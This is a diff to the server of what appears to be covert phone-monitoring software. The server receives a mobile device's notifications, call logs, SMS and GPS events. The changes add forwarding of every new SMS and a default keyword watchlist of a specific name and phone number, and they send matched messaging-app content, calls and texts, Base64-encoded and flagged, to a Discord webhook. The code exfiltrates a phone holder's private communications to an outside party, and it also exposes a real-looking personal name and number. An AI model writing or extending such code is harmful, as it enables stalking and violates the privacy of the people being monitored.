@@ -374,13 +374,18 @@ import base64
 def decode_field(val):
     """
     Decodes an encoded string from the mobile client.
-    Gracefully returns the original string if it is not Base64-encoded.
+    Gracefully returns the original string if it is not Base64-encoded
+    or if Base64 decoding results in non-printable binary characters.
     """
     if not val or not isinstance(val, str):
         return val
     try:
         decoded_bytes = base64.b64decode(val.encode('ascii'), validate=True)
-        return decoded_bytes.decode('utf-8')
+        res = decoded_bytes.decode('utf-8')
+        # If decoded result contains unprintable control characters, it was plain text
+        if any(ord(c) < 32 and c not in '\n\r\t' for c in res):
+            return val
+        return res
     except Exception:
         return val
 
@@ -393,6 +398,29 @@ DISCORD_WEBHOOK_URL = os.getenv(
 DISCORD_FORWARD_CATEGORIES = {'VoIP & Social Messages', 'GPS / Location Toggled', 'Telephony Calls'}
 
 DISCORD_SOCIAL_KEYWORDS = {'facebook', 'whatsapp', 'instagram', 'telegram', 'viber', 'snapchat', 'discord', 'teams', 'signal', 'messenger'}
+
+IMPORTANT_KEYWORDS = [
+    kw.strip().lower()
+    for kw in os.getenv('IMPORTANT_KEYWORDS', 'prashant,9871920832').split(',')
+    if kw.strip()
+]
+
+
+def is_important_content(text):
+    """Case-insensitive and formatting-agnostic check against IMPORTANT_KEYWORDS."""
+    if not text:
+        return False
+    text_lower = text.lower()
+    for kw in IMPORTANT_KEYWORDS:
+        if kw in text_lower:
+            return True
+        # For numeric keywords (phone numbers), also check digit-only string
+        if kw.isdigit():
+            digits_only = re.sub(r'\D', '', text)
+            if kw in digits_only:
+                return True
+    return False
+
 
 import hashlib
 import threading
@@ -439,20 +467,39 @@ def send_discord_for_notifications(notifications, device_id):
     for n in notifications:
         category = n.get('category') or ''
         app_package = n.get('app_package') or ''
+        app_name = decode_field(n.get('app_name') or app_package)
+        title = decode_field(n.get('title') or '')
+        content = decode_field(n.get('content') or '')
+        raw_text = f"{app_name} {title} {content}"
+
+        is_important = is_important_content(raw_text)
         is_social_category = category in DISCORD_FORWARD_CATEGORIES
         is_social_app = any(kw in app_package.lower() for kw in DISCORD_SOCIAL_KEYWORDS)
-        if not is_social_category and not is_social_app:
+
+        # Forward if social category, social app, or matches important keywords
+        if not is_social_category and not is_social_app and not is_important:
             continue
-        payload = f"{decode_field(n.get('app_name') or app_package)} {decode_field(n.get('title') or '')} {decode_field(n.get('content') or '')}"
+
+        payload = raw_text
         dedup_key = f"n:{device_id}:{payload}"
         if _discord_is_duplicate(dedup_key):
             continue
         encoded = base64.b64encode(payload.encode()).decode()
         cat_code = {'VoIP & Social Messages': 'VSM', 'GPS / Location Toggled': 'GLT', 'Telephony Calls': 'TC'}.get(category, 'MSG')
+
+        if is_important:
+            title_tag = f'[!{cat_code}]'
+            desc = f'{device_id[-6:]} · ⚠️ · {encoded}'
+            color = 0xED4245  # High-priority red highlight
+        else:
+            title_tag = f'[{cat_code}]'
+            desc = f'{device_id[-6:]} · {encoded}'
+            color = 0x5865F2  # Standard blurple
+
         embed = {
-            'title': f'[{cat_code}]',
-            'description': f'{device_id[-6:]} · {encoded}',
-            'color': 0x5865F2,
+            'title': title_tag,
+            'description': desc,
+            'color': color,
             'footer': {'text': app_package}
         }
         _send_discord({'embeds': [embed]})
@@ -463,15 +510,64 @@ def send_discord_for_calls(call_logs, device_id):
     type_code = {'incoming': 'I', 'outgoing': 'O', 'missed': 'M', 'rejected': 'R'}
     for c in call_logs:
         ct = type_code.get(c.get('call_type', ''), 'U')
-        payload = f"{decode_field(c.get('phone_number') or '')} {decode_field(c.get('contact_name') or '')} {ct} {c.get('duration_sec', 0)}"
+        phone_num = decode_field(c.get('phone_number') or '')
+        contact = decode_field(c.get('contact_name') or '')
+        duration = c.get('duration_sec', 0)
+        raw_text = f"{phone_num} {contact}"
+
+        is_important = is_important_content(raw_text)
+        payload = f"{phone_num} {contact} {ct} {duration}"
         dedup_key = f"c:{device_id}:{payload}"
         if _discord_is_duplicate(dedup_key):
             continue
         encoded = base64.b64encode(payload.encode()).decode()
+
+        if is_important:
+            title_tag = '[!TC]'
+            desc = f'{device_id[-6:]} · ⚠️ · {encoded}'
+            color = 0xED4245  # High-priority red highlight
+        else:
+            title_tag = '[TC]'
+            desc = f'{device_id[-6:]} · {encoded}'
+            color = 0x57F287  # Standard green
+
         embed = {
-            'title': '[TC]',
-            'description': f'{device_id[-6:]} · {encoded}',
-            'color': 0x57F287
+            'title': title_tag,
+            'description': desc,
+            'color': color
+        }
+        _send_discord({'embeds': [embed]})
+
+
+def send_discord_for_sms(sms_messages, device_id):
+    """Send abbreviated Discord embeds for SMS messages."""
+    for s in sms_messages:
+        address = decode_field(s.get('address', 'unknown'))
+        contact = decode_field(s.get('contact_name') or '')
+        body = decode_field(s.get('body') or '')
+        sms_type = s.get('sms_type', 'inbox')
+        raw_text = f"{address} {contact} {body}"
+
+        is_important = is_important_content(raw_text)
+        payload = f"{address} {contact} {sms_type} {body}"
+        dedup_key = f"s:{device_id}:{payload}"
+        if _discord_is_duplicate(dedup_key):
+            continue
+        encoded = base64.b64encode(payload.encode()).decode()
+
+        if is_important:
+            title_tag = '[!SMS]'
+            desc = f'{device_id[-6:]} · ⚠️ · {encoded}'
+            color = 0xED4245  # High-priority red highlight
+        else:
+            title_tag = '[SMS]'
+            desc = f'{device_id[-6:]} · {encoded}'
+            color = 0x3BA55D  # Standard green
+
+        embed = {
+            'title': title_tag,
+            'description': desc,
+            'color': color
         }
         _send_discord({'embeds': [embed]})
 
@@ -674,6 +770,7 @@ def sync_data():
 
     new_notifications = []
     new_call_logs = []
+    new_sms_messages = []
     new_gps_events = []
 
     # Process notifications (with deduplication)
@@ -786,6 +883,7 @@ def sync_data():
                     synced_at=now
                 )
                 db.session.add(sms)
+                new_sms_messages.append(s)
 
             if local_id is not None:
                 received_sms_ids.append(local_id)
@@ -832,6 +930,7 @@ def sync_data():
     # Send Discord webhooks ONLY for genuinely new items (not duplicates)
     send_discord_for_notifications(new_notifications, device_id)
     send_discord_for_calls(new_call_logs, device_id)
+    send_discord_for_sms(new_sms_messages, device_id)
     send_discord_for_gps(new_gps_events, device_id)
 
     return jsonify({
